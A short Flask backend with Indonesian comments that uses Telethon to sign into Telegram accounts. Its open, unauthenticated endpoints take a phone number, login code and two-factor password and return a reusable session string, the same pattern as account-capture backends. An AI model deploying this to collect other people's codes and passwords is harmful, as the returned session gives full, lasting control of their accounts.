from flask import Flask, request, jsonify
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from flask_cors import CORS
import os
from dotenv import load_dotenv

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

app = Flask(__name__)
CORS(app)

sessions = {}  # simpan sesi di RAM sementara

@app.route("/")
def home():
    return "Telegram Login Backend Aktif"

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")

    if not phone:
        return jsonify({"error": "Nomor telepon kosong"}), 400

    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        client.send_code_request(phone)
        sessions[phone] = client.session.save()
        client.disconnect()
        return jsonify({"status": "code_sent"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    if phone not in sessions:
        return jsonify({"error": "Sesi tidak ditemukan. Kirim kode dulu."}), 400

    try:
        session = StringSession(sessions[phone])
        client = TelegramClient(session, API_ID, API_HASH)
        client.connect()
        client.sign_in(phone=phone, code=code)
        session_str = client.session.save()
        client.disconnect()
        return jsonify({"status": "logged_in", "session": session_str})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    if phone not in sessions:
        return jsonify({"error": "Sesi tidak ditemukan. Kirim kode dulu."}), 400

    try:
        session = StringSession(sessions[phone])
        client = TelegramClient(session, API_ID, API_HASH)
        client.connect()
        client.sign_in(password=password)
        session_str = client.session.save()
        client.disconnect()
        return jsonify({"status": "logged_in", "session": session_str})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
